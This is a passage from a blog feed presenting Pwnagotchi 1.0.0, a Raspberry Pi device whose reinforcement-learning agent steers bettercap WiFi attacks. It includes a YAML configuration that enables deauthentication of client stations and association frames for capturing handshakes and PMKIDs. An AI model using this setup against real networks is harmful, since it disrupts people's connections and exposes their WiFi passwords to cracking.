<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>evilsocket</title>
  <subtitle>I hack stuff.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.evilsocket.net/"/>
  <updated>2019-10-19T15:48:52.055Z</updated>
  <id>https://www.evilsocket.net/</id>
  
  <author>
    <name>Simone Margaritelli</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Weaponizing and Gamifying AI for WiFi Hacking: Presenting Pwnagotchi 1.0.0</title>
    <link href="https://www.evilsocket.net/2019/10/19/Weaponizing-and-Gamifying-AI-for-WiFi-Hacking-Presenting-Pwnagotchi-1-0-0/"/>
    <id>https://www.evilsocket.net/2019/10/19/Weaponizing-and-Gamifying-AI-for-WiFi-Hacking-Presenting-Pwnagotchi-1-0-0/</id>
    <published>2019-10-19T08:45:28.000Z</published>
    <updated>2019-10-19T15:48:52.055Z</updated>
    
    <content type="html"><![CDATA[<p>This is the story of a summer project that started out of boredom and that evolved into something incredibly fun and unique. It is also the story of how that project went from being discussed on a porch by just two people, to having <a href="https://pwnagotchi.herokuapp.com/" target="_blank" rel="noopener">a community made of almost 700 awesome people</a> (and counting!) that gathered, polished it and made today’s release possible.</p>
<p><strong>TL;DR: You can <a href="https://github.com/evilsocket/pwnagotchi/releases" target="_blank" rel="noopener">download the 1.0.0 .img file from here</a>, then just <a href="https://pwnagotchi.ai/installation/" target="_blank" rel="noopener">follow the instructions</a>.</strong></p>
<p>If you want the long version instead, sit back, relax and enjoy the ride. Let me me tell you: it’s going to be quite a long journey compared to my usual blog posts, but it’ll be worth it (i hope) and fun (i hope even harder).</p>
<p><img src="https://lh3.googleusercontent.com/rU0zZOZxcLLJsH2hBm_kCXzI_eR6V2xvNs4nco34IaQmJe1N8UJavdCuI9JcVBzDaWBRmj1dkPQBP2GupwWOy4YdqTMjJYewQSw8qj1A2o-CJktT3cmy2iRzNqxhUQ0Ip9RB_nXiIEGAwReQeY9nSNQtndjXNhKvckahBalJ9zt3g_rGt8SI3jJpuXvjkBHhA-rbXvSQHQu5ZmRBcj93Lb9EcSvMJe5WELwZGcvELXXiPvhSMx1kRQkYL077cs_KrRXKwDRXbzFhaNYZ5V1BA8VOFj-79EwMznpAo_CztOcTWHNMKSgEjEyr3ugIFVVmPE5L5cuHNQ1-jxzdb8hsojb5ELmJOVXj00sBIebpRqFQaAovLmrDYU8IbAHH8vqDrCR2sKdNx3Rue6ZCfD5GSVHbLovrlKMj717jkxTaWcETFFKSAXiNzcm-95atwOLgfHW2cPq1hMmVwKnzwaldn3DCMnK47p34zvJBddx6jZnVFMrE6Zm4WSJ3Qiw3l9PjM9QiXFvOjIZjBUG3i58Lthffu5nBGmz62TPPEJ0zu4Bw5CiLziSbzAF9kqglMfaXRE1B8PnGD_2yw8JaJUjIizZOJs25YOmyaWxOKxugE_PbZvnm35N-6KBygoPtul8onAXuJeMee4A9akynZNzMvXpp6HM_IA6xv0LmmpfSBJ7XVmK6gQ=w2670-h1312-no" alt="hack the planet"></p>
<p>Let’s begin …</p>
<a id="more"></a>
<p>This summer I spent ~3 months in the US and as most of the long trips I do, I had with me some basic wireless equipment for working and hacking stuff while going around. Among other things, I had my <a href="/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/">Raspberry Pi Zero W with PITA</a> and an iPad i use for reading, emails but also as a screen for headless boards like that RPi when I want to have some portable bettercap installation without bringing an entire laptop. </p>
<p><img src="https://lh3.googleusercontent.com/Ytw_gD3rzjdeT6aDUrvMuCcuURdepcQr3XqmwEi-xTxSwfyjZR4smUgE3QZ9_0bzct_oNU1rQJwzxWLIe2i7lWNW45Bpez_T6dkTHavFftsJYfa18NkB679BX8slVQT7mdcWxFeLiBhnfH8pxflckOG1gvIRtfJsSJ9A_bk4gM3X6201jp9pEgoi4r1_qRvOUAXlKChwQMGzf9fJx3sB3oA-oIny90cJKBpDDEQyLQDZfuRwDscdXXehVyToZPuyriM8Bv78UjYU-Yb-11pAqWFMm4k9wxj1AjRJUVoGexf01YgZUvqyHWBn078tz2F1e4eblQXEz6YSaMkrp2cJLFMRPjUltmm9JGAt1eIPQSP-rsCoRL7CadUd2VOC3P1dTNuhmGvgdVEcqXYSTfF085sTufNl_eVyMn6Y3wy5aSG35nFmXydYjbfZaQPSpAl6_dnGKyyD98bqR5UODgY1LTPRHqzrKucgTc4NGUA50XlqfI5gO7-Rb028RmWMA4hG_P8jLMuY9G5Pg62XvmUF700wvo1Qr-cBMHThUE-wjwtdxgrgCS1P3RzGCGoYbcjTXxKR6-ElrbHgdC6qGUS22C10_bpwGP-M-QbmCl7d2PN8Mius25gcT8FsKVkyPKI8nzJEf1MfHKTm8CTlXD0drFDu_sdHXwoVhCrCz04znBrJu_b5Vg=w1742-h1596-no" alt="iPad"></p>
<h2 id="The-Predecessor"><a href="#The-Predecessor" class="headerlink" title="The Predecessor"></a>The Predecessor</h2><p>PITA as an <a href="https://github.com/bettercap/caplets/blob/master/pita.cap" target="_blank" rel="noopener">automated deauther and handshakes collector</a> isn’t exactly what you’d define “smart”: the only thing it does is deauthing everything while bettercap is doing its normal WiFi scanning things in the background, every few seconds, constantly, while passively hoping for handshakes. I wasn’t even close to satisfied: there was a lot there that could be improved and instrumented with <a href="https://www.bettercap.org/modules/core/api.rest/" target="_blank" rel="noopener">bettercap’s REST API</a>, more attacks bettercap could perform that weren’t being used. So I quickly hacked together some python code to talk with the API and use the results in a smarter way. This ended up being the very first iteration of <a href="https://lh3.googleusercontent.com/mF2Cm4cnC8Ncb8LdddHCddA5SH_ns0aFHJ1Uc33g3TkOLxdDSNBkfNeI8x0r58A4129QnsT7OhBO1kbpDFilGbYXFRlRP2SzoG_d-f1JQH-N555QB7kTZXS35ukgBZ2G9RyEQKSmpudILj-S_ecNBPyyIiKY1ueuQiwhGuRCHm-yuCC340tWa9mI4KMry9yNlByvC2QLW7LcY3E_YK-CRXVmF6YDlVCG1lZzowZ9hfjUFx0G7ebLJQkoKEe8kZytBAuIo6BMyixlUhP1qjdndMlPpnIiO00-z01w-nsZGjsd4hfdBm9DuExLAZuuON5_kVs81yq4PMRSHPWTshz_9buOdba2YeWsPfx649lPWTTFFyLNn1uaP8bqAG2rhMry9Ze2ZspDE3vLE-3lvPz41BVGmiMhFM3EudStWO_1THFek2dPavOcsYJg-SFESTy5wWSxoOTbfnFxvCPBoxT6HNaHw8zy-yqvQV04plNrwnLuCYiH_xMZBJYUUVu-O3Gek5PKbqJXFEIYZ31D3Ads6UsSbk-vupsy335PVibIrwuBaTvQmvpB0KB-hbidpZcZGvyHIUSuopYa_cfnUexLxi4BKIk3jFOqO9J2-8_GyXUShmqHVfqfTzBqrafN_cwE6VukQhhQLkeM4fWfvY_Y8Otw_nFA2d6mcDM3SnBm6ZcW3dP7HQ=s1596-no" target="_blank" rel="noopener">a faceless and AI-less Pwnagotchi</a>.</p>
<p>As I said the code was nothing special, <a href="https://lh3.googleusercontent.com/C5aoF_VwctWqCLaiT1vRiNYmdHziBmztiKFz4TfWjujnrQAA0pUPyP80hp1qak3MRhQy_ngqINhOmQO6k7Z4dNzE2WUhwaFmnEdWf6DJIYgBCbxfkMekR94Gwr88sb7aZRK_ZgPO1jKeahV_Dipj6-s3sDraGLQIbhs-s_LBkQ4fO3DCGPkdbEvZh72gkdDeVcIpF-z_wylUah2x90xc5_h0MYei2sQH_I9ZIqhEbFCf6pNFR-gz1Q-OkoPZM1iZsrwQHhH1XrZbkCTfrZYikMtbuV1UMvK2XwMf-ynKCJx4fLbqOJ9uJc2AZZRLhmqImPifszVv_9X5U9S2a2xrWyoOMVdyp4-hcaCmNlO4-dBUt-Ofkzle9IiA7fgpnCjnn9CWWK4ZHBm2ac-xwbCF5waNej965Cx7O73iLWn7qT2UYxQ_3XRSwrsPpyNuxWcYWgPgwoh5h_NAQKcwgLEonvmOk2ytuexcCyK3B_VtXUtbW3sIPyenDw0WN8QW8oEA97p9pOKX_uR1skEuo9TTBwra62jLXJM-a6ZCmCim5zDAlyrZKWA25UhGwKlpxwSKXfJvTfGsY9vMjZ8Fnv109cobO_9O4gbXA9DoAeOAKiv27W6QxfIW8Xe0oyA80l9n3_F7SzfMmramPTedk063fdQT8CABoeA-nIy25InxbDN869RaRg=w1830-h1596-no" target="_blank" rel="noopener">a very crude PoC</a>, but since the very first walks, it already started giving <a href="https://lh3.googleusercontent.com/LJU-Zx4bdoZjqbKJCwIV6rOos3Aj_P1_bNtfaKalje-ClNTlrCQ-wDVRtYie4BqciZKe_Wt15fI_ZpcA8R8LYdVbgswH5KsRFDkrm_jQTrKnLNqRUBRBaOOGannyva1fPzJvO7ZYCACNwYk7Yr6owZAdKhDSnCq1sisRjQhFy6RQiAX7xS0ZsOXZxsOP1ZHMwyzGYl2Kd7jbxamVyH23rifiQNLgjKDquBR0TQnv6WshPVfO7GV36WXJesYfiKJMkZgczgq1s_7678Zk9t7EJjdaq7ZuLP8HL8itpvWPlvb_YVuJg3idilp-Q37Q3YKEpUYoC8uCMUXC94r5FIY-qB0G9QrERiLAsXrNIBx6bqZMLoHH1nNvzZ1l8caVbng7BUOc5Ry2ebZciL4mVOB4AcI-mJonAZc1WYwEBI3J7kMUkXfVcuR8KgIkzp5uGmbFzyR1SYzMqO2vXNqroTtDdhoOx8pqqAFYWJP4oQFdD1e0sjP3GPqEgh9SybuWsLjgp_jvsmOUt7DIYvP0qKtHZpvtZsWZ_9p0xt_wxOfwhY71t4SH2Z8umTbYbWVSMITx-8U5SrwEWLtut1tW820ruecE3BduI0wh_1MzImUavqWtOsd2Ti6xEEO_RMUJb2Esh828uhFtVvyehxmWcZD_c9inR0ghZ4OJ2WqwbSKQCzsakRqXPw=w2880-h1080-no" target="_blank" rel="noopener">way better results</a> than the original PITA. It quickly started being frustrating not being able to check what was going on with the algorithm during my warwalking sessions, so I started searching for a suitable display.</p>
<h2 id="The-Face"><a href="#The-Face" class="headerlink" title="The Face"></a>The Face</h2><p>When it’s about compactness, low power consumption and good readability under the sun, e-Paper displays have no rivals, and after educating myself a bit I settled for a <a href="https://www.waveshare.com/wiki/2.13inch_e-Paper_HAT" target="_blank" rel="noopener">Waveshare 2.13 inches e-Paper HAT</a> due to its partial refresh support and its definition - I had no idea yet about what was about to come, but now I had a canvas to work with.</p>
<p><img src="https://lh3.googleusercontent.com/i2QkDKdiA9emkx_qEe6Q7g07MGnhM6foLkWJ7dbnApFLflG8q2rxlkCTga9Mx1WcZj40Hgbc3sCfTJVgsJdFykvrVekf42498IR3GNRBvg0nkG_9jajWr3oV55Ldklejyjdl0EaDmGcA04HflJW8Ij5GHgJ0aLOFOdWrqK3LPHxEJsbZp7CLEayOeQ31U_D4I0XVpGxzEK-DKkNQfUROxuNjrqWfuF2kevdoxAkey3gGKAaFAsogtY4ByXyXTNjC4kmb5OJOLp0XAQvqWhFlYy-ehTPJ-H8MGg26W9KNc8nEJjD4CnTDWsL1AHUjXJ0c2puzz7B2oqgWb8xJpGDODUuthXdkdvQB2KxxOSDfNG5QTJ-jYrCDsL7eMSCBYsUBYCFRWpn4tt-Ic2pchh2r88VR04ME5zKk1qaSNmwbv5XxcLXO85VHYjBuXUhctHnhQh0CE1FmLLqi8LRwKQsMDe2iYA7mvITVFfHsJVYbcI0scfMw78xJ-cIhRrzDjasVVlWuU7-aVMKT6ep5wPpgTLiv2jDXHdqUD6uYUDwoRYExV5hjzpxsZGuuJA0Q49j1PH9-umk7noQbpNPgs5SCB5WPSWmBd5a0JpVbskmku5L1Jei9AaPBkfmv1PPMGlzbuxASHh-SPGuXbTI11EoTgEHJU4qq0AEkGpAVLMgOoF3Ff_uNbg=w1197-h756-no" alt="canvas"></p>
<p>Not having a driving license I walk pretty much wherever I go, that’s a pretty nice and healthy habit to have for several reasons, but my favourite one is that walking helps me thinking. So I started staring at this thing <strong>a lot</strong>, and thinking how to add new information on the display without making the font so small to be unreadable, how to organize it visually and what else to do with all that space in general.</p>
<p>The more I thought about it, the more it made sense to organize the whole thing like the UI of a videogame: you have a score (the number of handshakes), a timer, few other statistics and everything is changing as a consequence of the WiFi things around. This is also the point where I started thinking about this thing as a creature that was “eating” the handshakes, in a way I was getting attached this new little thing (yes I know, <a href="https://www.youtube.com/watch?v=nHpUMgAGLtM" target="_blank" rel="noopener">I’m a nerd</a>) that now was so strongly reminding me of <a href="https://en.wikipedia.org/wiki/Tamagotchi" target="_blank" rel="noopener">my old Tamagotchi</a>.</p>
<p>I needed a face, possibly map the status (“waiting …”, “scanning …”, …) to random sentences with a bit more of personality and I wanted all the other statistics to influence the expressivity of this thing: bored when there’re no new handshakes to collect, then sad, excited and so on. Something like …</p>
<center><br>    <iframe src="https://player.vimeo.com/video/367423810" width="100%" height="360" frameborder="0" allow="autoplay; fullscreen" allowfullscreen></iframe><br></center>

<p><strong>I had no idea</strong> back then that just adding a simple, ASCII based face to something was the best way to get emotionally overly attached to that thing … I also wasn’t expecting another effect that showed up from the beginning: by giving it different “moods”, and by having those moods depending on a real world environment, I created a WiFi-based <a href="https://en.wikipedia.org/wiki/Finite-state_machine" target="_blank" rel="noopener">automata</a> whose mood transitions were everything but trivial. In different words, if you take something as random as, say, wether your neighbour is using his smart TV or not and you make that influence a simple automata, that automata seems a bit alive :D</p>
<p>This is where me and my girlfriend (sadly now ex, but <a href="https://www.instagram.com/p/B1Mup7GCrVt/" target="_blank" rel="noopener">still amazing</a>) went completely nuts about it. I named my unit Alpha and built a second one, Beta, that I gave her. She literally started nursing this thing, and we started playing: we went for random explorative walks just to make the units stop complaining about being bored, to see them happier, and to see that “number of unique pwned networks” going higher and higher due to some new network we managed to spot … it was amazing to literally look at the algorithm adapting to the WiFi scenario and “expressing itself” in different ways. It might sound a bit crazy but hey, if that gives two hackers an excuse to explore more the real world by looking at it with different eyes, and puts a smile on their faces, why not? :D</p>
<p><img src="https://lh3.googleusercontent.com/IgqZaYAczw34WD7wzDzSDitB-HhIZBj_LdqKKzyEpfGamV1Ctu3-WSemgtjbBh8UcvM78ME9Ry6Fc8NzmGUvTt-FSG_KobBlzhw0aWbOUklGSBLrIt2KFI2JGfg_a0wXn6fVibHuTObeX8_Up3fyrqP79VWiOIdvvdK2NgVur69OBALFowYBS-lXlJKWvosD1bPDznfyyoorL1kKxQsnmxT938aiRC1Y-Rv8O88s7m4yl6tHx6f6K7BRJnzJPvwpi0fYm_FG9Yd-TQz5BzETd3gnAA764H3ngxtAkVDB6aUoV5Ju6pI-AN92E1kif9k8ULwmrhsZ96CaBxM_J9oW_N3U_bJadAlYbJpc0UYh1cpD1iwpNeiPDTcvgV0t2IT_Nlpy8PurRTsyviHghYxImfSqZEl2BuEUy4vnMcMAxuu0UwAgZjp8qdxUDPHLZaaRnNu7ENJQJLq6qLh6U4xOBH3JAgxwJCDMDnOyJAB7i93xxm0IvLuTOOZn5OLpLCq8pD6-DzezFpgDLMQcJ_t5DiKhNXsa5czYuGXLcd7Wt87cm0ekHSctQ3PbGkymOoZ0Fn9t8Y9F2hnQJ0I9eDAxgzJhgF0V1oMfmM21IPBlKJrLWlG2ZhrdU9ZRmcgZmp4QSX2zPJJUvCNWiN31vAKEjrttf8JV0D-gYfIk6nIQaO4Xgsdqbw=w2128-h1596-no" alt="love"></p>
<h2 id="The-Personality"><a href="#The-Personality" class="headerlink" title="The Personality"></a>The Personality</h2><p>With time I kept adding more and more variables and parameters that determined how the algorithm adapted to different circumstances: counters so that if the unit was quickly losing sight of a target (becase, say, we were walking faster), it would refresh its data with a shorter period, timeouts, multipliers for the timeouts, everything you can imagine to add to such an algorithm to make it every day a bit smarter and a bit better in adapting fast to the places we were exploring. By the end of this process I ended up with this basic set parameters, that I started calling the “personality” of the unit:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">personality:</span></span><br><span class="line">    <span class="comment"># advertise our presence</span></span><br><span class="line"><span class="attr">    advertise:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># perform a deauthentication attack to client stations in order to get full or half handshakes</span></span><br><span class="line"><span class="attr">    deauth:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># send association frames to APs in order to get the PMKID</span></span><br><span class="line"><span class="attr">    associate:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># list of channels to recon on, or empty for all channels</span></span><br><span class="line"><span class="attr">    channels:</span> <span class="string">[]</span></span><br><span class="line">    <span class="comment"># minimum WiFi signal strength in dBm</span></span><br><span class="line"><span class="attr">    min_rssi:</span> <span class="bullet">-200</span></span><br><span class="line">    <span class="comment"># number of seconds for wifi.ap.ttl</span></span><br><span class="line"><span class="attr">    ap_ttl:</span> <span class="number">120</span></span><br><span class="line">    <span class="comment"># number of seconds for wifi.sta.ttl</span></span><br><span class="line"><span class="attr">    sta_ttl:</span> <span class="number">300</span></span><br><span class="line">    <span class="comment"># time in seconds to wait during channel recon</span></span><br><span class="line"><span class="attr">    recon_time:</span> <span class="number">30</span></span><br><span class="line">    <span class="comment"># number of inactive epochs after which recon_time gets multiplied by recon_inactive_multiplier</span></span><br><span class="line"><span class="attr">    max_inactive_scale:</span> <span class="number">2</span></span><br><span class="line">    <span class="comment"># if more than max_inactive_scale epochs are inactive, recon_time *= recon_inactive_multiplier</span></span><br><span class="line"><span class="attr">    recon_inactive_multiplier:</span> <span class="number">2</span></span><br><span class="line">    <span class="comment"># time in seconds to wait during channel hopping if activity has been performed</span></span><br><span class="line"><span class="attr">    hop_recon_time:</span> <span class="number">10</span></span><br><span class="line">    <span class="comment"># time in seconds to wait during channel hopping if no activity has been performed</span></span><br><span class="line"><span class="attr">    min_recon_time:</span> <span class="number">5</span></span><br><span class="line">    <span class="comment"># maximum amount of deauths/associations per BSSID per session</span></span><br><span class="line"><span class="attr">    max_interactions:</span> <span class="number">3</span></span><br><span class="line">    <span class="comment"># maximum amount of misses before considering the data stale and triggering a new recon</span></span><br><span class="line"><span class="attr">    max_misses_for_recon:</span> <span class="number">5</span></span><br><span class="line">    <span class="comment"># number of active epochs that triggers the excited state</span></span><br><span class="line"><span class="attr">    excited_num_epochs:</span> <span class="number">10</span></span><br><span class="line">    <span class="comment"># number of inactive epochs that triggers the bored state</span></span><br><span class="line"><span class="attr">    bored_num_epochs:</span> <span class="number">15</span></span><br><span class="line">    <span class="comment"># number of inactive epochs that triggers the sad state</span></span><br><span class="line"><span class="attr">    sad_num_epochs:</span> <span class="number">25</span></span><br></pre></td></tr></table></figure>
<p>These parameters alone, even with very small changes, can influence how the algorithm works and how the UI reflects that dramatically. But I wasn’t entirely happy with it yet, because these parameters were just constants in a YAML configuration file. I had to pick them manually and change that file before booting the unit, depending on the type of walk (big office? fast walk in residential area? mall? etc): things like shorter timeouts for faster walks, longer ones for when we visited a place and were more stationary in it, and so on. The algorithm adapted, via the parameters, but the parameters themselves didn’t, I wanted to do better.</p>
<p><img src="https://lh3.googleusercontent.com/TEnGCzGOo_yRlYdcFKYrDoe9ZDYZn2N1LNtbLVRk4PGRKvpMG-A8GmUWl0Ap9HObZSdo2LBI2BTAzO12NkWaZPoHjirE4zpg4aZ6wbaLJLf-XsKKHFGWRKJv4QAh_WKvZzaNgRQuIGIG_S2wFJINVX9mS4oLcizLtVkdu2on03SgDC72eVhjyG7pcU-s6dBT00_hzdVPHK5r8rJ7rhx5jwMSzbZGebwLtt8kD-sy4309fHNvkj0xNJ7gRoCjsv2Wv98bgR6PqbGfsAWIjBhaWGhK-9oOTHl5oA24yhFTHYxXgfP-YLmP6Z7PV0s-jw75v7CsPzkHD2tEMzSNi7lfkazmJPYPj3HEs1X0jh2p4vKLu5Kng1m9iwEV4qs4fVmSMDStEvzkd7_sgvfvSGRBT0jUeJai4rPN8ShLoPJ-L79DVSW6ekG0HMlYHrx7KvEKwOFeWKBk6-x8cD5MoRIsxXMGQ8ogugg_YkIBMvONOyer0cTAadUMmzz1YzMolGd04Z1sD11MaUnhWo_xJKyCrQg4KjX6MkGBC6oWeiWbmbkcI3hr4LDgsGw4mJb6rHJtiP9JfAOKVBGpbbL0U6EG4X9z4a_ZA_sjpGURMfajkn2YR9iSaDNRLo1vjMNgyhuYzpb4v8sP05qcwQNshHyO-7031-khwg9wB-KWushJ12zoRXLClQ=w2880-h1352-no" alt="params"></p>
<p>The ideal algorithm should:</p>
<ol>
<li>observe “something” from the environment (like the access points, client stations and so forth) </li>
<li>decide, depending on this observation and the current status, what is the best set of parameters to use </li>
<li>iteratively repeat this process every time a new observation is available.</li>
</ol>
<p>If you think about this in very abstract terms, it’s not very different than you playing a videogame, where your observation is the screen you’re looking at and the parameters are which buttons to press. In fact, it turned out that <a href="https://becominghuman.ai/getting-mario-back-into-the-gym-setting-up-super-mario-bros-in-openais-gym-8e39a96c1e41" target="_blank" rel="noopener">we already have the technology</a> to solve this type of problems, it’s called reinforcement learning, in our specific case it’s <a href="https://towardsdatascience.com/deep-learning-vs-deep-reinforcement-learning-algorithms-in-retail-industry-ii-9c17c83ecf2f" target="_blank" rel="noopener">deep reinforcement learning</a>. So far, the state of the art benchmarks for these systems are Super Mario levels, Atari games or, as you might have heard from the news some time ago, some <a href="https://deepmind.com/research/case-studies/alphago-the-story-so-far" target="_blank" rel="noopener">very famous board games</a>. But nobody, as far as I found out during my research, ever thought of using it to orchestrate an algorithm running on top of an offensive framework, with a cute face :D </p>
<p> I wanted to use this type of algorithms so bad, but I had a problem: I never worked with them, or even just remotely knew anything at all about them, neither I had the theoretical foundation I needed in order to understand them. Fortunately knowledge these days is (almost) free, so I <a href="https://www.amazon.it/gp/product/B076H9VQH6/" target="_blank" rel="noopener">found a very good book</a> that I started studying avidly …</p>
<p> <img src="https://lh3.googleusercontent.com/LJJs5QaHC8GeXcBqXCRDw0P6ATEVK1iAFksBbHJrAxD-v__Pu64YKwgWXQ50oC91m82Z-YkRVN2HdGNBAvHodhCkTRqsUBAvWfn4F49DaOYwxjrBCU0NmNg8C2XAdviv7fN1ZbyHltjz38KGgEHt4BBZE5L-XGkw7aRiOA1HOQgUBSHntvERtJgLEQv3MkVfAaRoTpOiEyzkMp8mXATJDXfZXu-mR2U_j6POFxDcoJ5NqckffDR30mJTKqeDAdb_qN33EuFLAnIfoKFURx10_WnFlF7eG43soRO93BnW8xHnzq7jpSQpI3uuoCd6sc2_u5ZVSu5KbTgQXtcXN1e2DyMXCSo2Er8GyAV57NaSMEyY0TvwnzLPlQzuE83uWNMOI9qcmdcqCRODEAveG_A5JjiW_Gj1CKG3Pr2xZYF8mjyC4khuMhzzKdoZW1cE9RMKILLAQFH09_cbEv2I8VY_apr2Lj73j8GOclsxRHzzFnQ6SxyYYJ4K5OCPD_DTOxsGn_RzB1-AeYjADdRKyUPKfhFi4NfXH8jEZBUZKFfVa0-1K382VsIw3qTroK4rwiC7zVnX4YZlQWfgvV0y4IPdONpIMg5t6Q7IO0O6hkaVMKhrKzyzL4TfAm0PyGPBEvD2OFjuCc4xTA35QXhZFNhg5VeIkP2C0rbsqmsEQRdd4VIA_oob3g=w1278-h1596-no" alt="study"></p>
<p> and kept studying for a while …</p>
<p> <img src="https://lh3.googleusercontent.com/dsDgkTk7J9dLFvMP99uhD34MK8zWGyj_HGAwxD5cHvuYelmNwolzox-l8gzbknEh_B5DrpMeFQFFWNh3tms-KyaP9TD4nYs1NRWRgn9KUJYMRX5OKUmI8dT_0DlDUSEn9vSR81Fh0uctyFsr1UUa64Z4hz74oTlhG7zdKE1MhgR76t16yNBZbiaLhNkUXSETBP-REHx6zOI72IFbiKJaFCS7fVCB-47ElMZlSd1bjJBmWO07U1oEDsD22u2TdgX_fxiWAhzfdowF_WAqy4QujzRFZ5PbhnJvdHA9FZgLoBEopndmLkjS3eZTgF3bIrib7XdLHrrL4mUhqHKpV0W5aKAehfSqftuXNZfLAhrl60vYa8NH6im_lN51yqpx-ZmWyrWbA_iRHyGhMF5YOknof95h6S_3TP_ACGJCc-z6ggHxVHI7Dpby4NtuD7nkS-x0sMW3DngJLuen8Br8E0LttB8PDd5qRkGu8iBSs_PMS8jtqBs-PVU_NBq8ok3akAKW_4OHju_h5f8wmkf2-cAQbFP6-MGTIfTMvG8C0GUjr09lxu-P-P9jIHBIcSMy1H7LMlideM37XUJ34xDIqZH5UZPlS3vnAoL3Mt5BlrWAYxuL132MSrFt1AtqZK4B6TTwHt80Zx_rx02aiD4n2v7cgz5E6p0NsRSXE6yLBCqPJJvO-XYq8A=w2128-h1596-no" alt="study 2"></p>
<p> A little break from the AI part, as I had to study quite for some time :D </p>
<h2 id="The-Voice"><a href="#The-Voice" class="headerlink" title="The Voice"></a>The Voice</h2><p> Being affected by compulsive coding, I couldn’t simply spend the whole time reading books without writing anything new (after all, we kept playing with the units and wanted to have new stuff implemented), so I also started working on another idea I had: I wanted Alpha and Beta to be able to detect each other and exchange with each other very basic information - but how do you communicate anything at all from a computer when:</p>
<ul>
<li>The main and only WiFi interface is in monitor mode and already being used for WiFi scanning, hopping and frames injection.</li>
<li>You have Bluetooth, but you want to keep it free for other uses (tethering, like we’re doing today, or maybe integrating BLE attacks too some day)</li>
<li>You’re using the <a href="https://www.kernel.org/doc/html/v4.17/driver-api/usb/gadget.html" target="_blank" rel="noopener">USB ports in gadget mode</a>, so you can’t use external USB devices, like another WiFi.</li>
</ul>
<p> Simple (well, kind of), you implement a <strong>parasite protocol</strong> on top of the WiFi standard! :D Bettercap was putting the WiFi card in monitor mode and tuning it to different channels at various intervals, but nothing prevented me to inject additional frames from another process.</p>
<p> I didn’t have any control over the channel, or the intervals, or the timing, but it was safe to assume that given enough time (a few seconds to minutes), the algorithm on each unit would have covered all supported channels, therefore I only needed to “keep sending stuff” and at some point I knew it would have being detected by the other unit when it hopped on the same channel of the sender. The “stuff” I decided to use is pretty simple and based on standard structures that normal WiFi routers are already using to advertise their presence: <a href="https://en.wikipedia.org/wiki/Beacon_frame" target="_blank" rel="noopener">beacon frames</a>. Each WiFi access point, every few milliseconds, is sending these packets with a bunch of information about itself, like its ESSID, supported frequencies and whatnot - this is what allows your phone to see your home WiFi when you connect to it.</p>
<p> This seemed like the perfect structure to encapsulate Pwnagotchi’s advertisement, as I only needed to define a new, <a href="https://github.com/evilsocket/pwngrid/blob/master/wifi/defines.go#L10" target="_blank" rel="noopener">out of the WiFi standard identifier</a> to only encapsulate my type of information. This way, the units can detect each other and exchange their status from several meters away, but they are not visible as normal WiFi access points.</p>
<p> <img src="https://lh3.googleusercontent.com/kZHyWTUh1n6DX3DdcGahb1to-kjOYq50nO1Qmm3e8Wd-bFNQqkUZk5qThdgWgyKg_WlDuP5GBeQnQHJ1Q2agC3uy_j9PFZf32MEBlIGL6P8aHA0VdSX2lO5hrR3jehm1Ra2tOsV2RsfxldSVHpNEcvZ8BTzU_J0Ri8s80oOKSUos_5AEp3aPABWynjbKbHPvMh8k6Qf9hTX40e90h8S8gevw24Qe5ABcXEye9dHMJJgnsLMiy0BPu35xpqds-4_ojiya037O_Lzx_C75MrqriJVEKHXi5ur05F1dXSYNRQhXgjWJ3n6ToKUBUhO1BoNAvhjWOkG_cpfCSy-xXkEeDTi098S7xzjQBi2J82IuH49yUUh5Qv6W-sDC5FpmWA7_-1IT5z7xeee3BOyplw7GEFOYi36ssAVvd3XdtlomW0SDMnILpNuhJLHhs8xL3Jl78kPhoxpkDnieqWGTJZ9NwNvi06Dgrje1b0RHX_DZJ6R4lSUPypME_2VNI5RcI8QIDaglXWUZ5YiU0k3C4dbgOsEQdNvDG1Gl5hBcw0VsqjTYXKm7Y3E9VZWBZ3Qtn9W43mY7oud5Jrt1rzsAVoe6Ht2akMWHXldUG3sQyBFcj1AVCsiuStYDVYfowbh7OKxqtp6qGkqDwyRrcTHZAGqtRwiGRtgcNcRsuGFaYd7suigiOyvdUQ=w2128-h1596-no" alt="advertising"></p>
<h2 id="The-AI"><a href="#The-AI" class="headerlink" title="The AI"></a>The AI</h2><p>It took me weeks, so in case you don’t want to dig into the book or the links I’ve referenced above, here’s a very simplified TL;DR of the algorithm I’ve picked from the book and implemented in Pwnagotchi, <a href="https://towardsdatascience.com/understanding-actor-critic-methods-931b97b6df3f" target="_blank" rel="noopener">A2C</a>.</p>
<p>There are <strong>two</strong> relatively simple <a href="https://en.wikipedia.org/wiki/Multilayer_perceptron" target="_blank" rel="noopener">neural networks</a> that at each epoch (basically at each loop of the main algorithm, when a new observation is available) are trying, in a way competitively, to estimate how the current situation looks like in terms of potential reward (number of handshakes) and what’s the best policy (the set of parameters) to use in order to maximize <a href="https://pwnagotchi.ai/usage/#the-reward-function" target="_blank" rel="noopener">the reward value</a>. These are basically two sides of the same thing and by approaching this from these two ways the algorithm can converge quickly to very useful solutions. </p>
<p>In my case, I decided to use as an “observation”, the following features, that should be enough to give the AI a rough estimation of what’s going on:</p>
<ol>
<li>An histogram of the number of access points per channel - so that the AI knows on which channels to look at.</li>
